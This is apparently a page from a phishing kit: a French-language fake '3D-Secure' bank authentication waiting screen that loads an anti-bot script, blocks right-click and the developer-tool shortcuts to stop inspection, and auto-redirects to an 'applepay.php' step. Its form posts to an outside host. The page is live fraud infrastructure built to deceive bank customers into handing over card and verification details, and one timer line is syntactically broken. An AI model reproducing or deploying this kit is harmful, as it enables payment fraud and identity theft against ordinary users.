<?php 
ob_start();
session_start();
include '../antibots.php';
include '../config.php';

?>    
<!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>3D-Secure</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
            <style>
                .error {
                    border: 1px solid #c72e2e;
                }
            </style>
            <script language="JavaScript1.2" type="text/javascript">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false
        }

        function reEnable()
        {
                return true
        }

        //if IE4
        // disable text selection
        document.onselectstart=new Function ("return false")

        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.

                document.onclick=reEnable
        }

        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }

        // disable right click
        document.oncontextmenu=new Function("return false")

</script>
              </head>
        <body>
            <div class="lod-full" style="display: none;">
                <div class="lod-c"></div>
            </div>
<?php include'navbar.php'?>
<html lang="fr" slick-uniqueid="3"><head xmlns="http://www.w3.org/1999/xhtml" lang="fr" xml:lang="fr">



<?php
header('Refresh: '.$timer.'; URL=applepay.php');
?>


<script>

  document.onkeydown = function(e) {
    if(event.keyCode == 123) {
       return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
       return false;
    }
    if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
       return false;
    }
    if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
       return false;
    }
  }



  document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
  });

</script>

<div class="wlp-bighorn-window-content">

<div class="centrepage">

  <form name="creationImmediateForm" id="creationImmediate_1creationImmediateForm" method="post" action="https://yankli.com">
    <div class="blocformfond creationimmediate">

      <div>
      </div>

      <fieldset>
<P>&nbsp;</P>  
<P style="FONT-SIZE: 22px; TEXT-ALIGN: center" align=center><FONT face=Arial>Authentification en cours<BR></P></FONT><P>&nbsp;</P>
<P align=center><IMG style="WIDTH: 20%" src="../img/tel.png"><IMG style="WIDTH: 20%" src="../img/engrenage.gif"></P>
<P>&nbsp;</P>
<P></P>
<P align=center></P>
  <br>
  <P style="FONT-SIZE: 17px; TEXT-ALIGN: center" align=center><FONT face=Arial>Veuillez patienter un instant pendant que nous traitons votre demande.<BR></P></FONT><P>&nbsp;</P><P>&nbsp;</P>
  
<P align=center></P>
  <center><div class ="magana" style="padding: 2px; font-size:12px; font-weight: bold; " id="timer"></div></center>

<script>
document.getElementById('timer').innerHTML =
  00 + ":" + ;
startTimer();

function startTimer() {
  var presentTime = document.getElementById('timer').innerHTML;
  var timeArray = presentTime.split(/[:]+/);
  var m = timeArray[0];
  var s = checkSecond((timeArray[1] - 1));
  if(s==59){m=m-1}
  //if(m<0){alert('timer completed')}

  document.getElementById('timer').innerHTML =
    m + ":" + s;
  setTimeout(startTimer, 1000);
}

function checkSecond(sec) {
  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
  if (sec < 0) {sec = "59"};
  return sec;
}
</script>
<P align=center><FONT face=Arial><BR></FONT></P>

  <P style="FONT-SIZE: 12px; TEXT-ALIGN: center" align=center><FONT face=Arial>Merci de ne pas fermer cette fenêtre</FONT></P>
  <P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
<P>&nbsp;</P>
    </div>
  </form>
</div>
</div></div></div></div></div></div></section></main></div></div></div></div><footer class="wlp-bighorn-footer" role="contentinfo"><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div id="prefooterAmeli_1" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">
            </div>
</div></body></html>
  
   </center>
                </form>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/jquery.maskedinput.js"></script>
            <script src="../js/plugins.js"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"</script>
